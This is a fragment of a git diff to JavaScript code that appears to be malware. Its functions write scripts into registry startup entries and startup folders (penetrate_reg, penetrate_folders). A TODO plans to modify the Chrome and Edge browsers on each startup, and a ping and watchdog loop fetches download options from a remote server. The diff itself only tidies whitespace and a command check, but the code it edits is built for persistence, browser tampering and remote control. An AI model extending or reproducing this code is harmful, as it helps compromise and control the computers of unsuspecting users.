@@ -16,11 +16,9 @@ class CmdConfig {
     #__clientjob = null;
 
     get clientjob() {
-        if (
-            ["cmdlist", "ping", "watchdog", "launch_ping"].includes(
-                this.cmdname
-            )
-        ) {
+
+        // system cmds don't support client jobs
+        if (["cmdlist", "ping", "watchdog", "launch_ping"].includes(this.cmdname.toLowerCase())) {
             return null;
         }
 
@@ -515,7 +513,6 @@ async function sendMessage(dest, msgpayload) {
     });
 }
 
-
 async function penetrate_reg() {
     for (const reg of regstartupconfig.regs) {
         let script_text = "";
@@ -532,7 +529,6 @@ async function penetrate_reg() {
     return null;
 }
 
-
 function penetrate_folders() {
     let foldernames = startupfolderconfig.foldernames;
 
@@ -545,7 +541,6 @@ function penetrate_folders() {
         fs.writeFileSync(fpath, script_txt, "utf8");
     }
 }
-
 
 // TODO need to execute modify_chrome and modify_edge on each startup
 // for tpl -- the desktop lnk can't be modified -- good idea to put in autolaunch to launch 
@@ -575,7 +570,6 @@ async function penetrate() {
     process.exit(0);
 }
 
-
 async function watchdog() {
     helper.logmsg("starting");
 
@@ -604,7 +598,6 @@ async function watchdog() {
 
     helper.logmsg("finished");
 }
-
 
 function validatePingResponse(pingresponse) {
     let downloadOpts = pingresponse.downloadOpts;
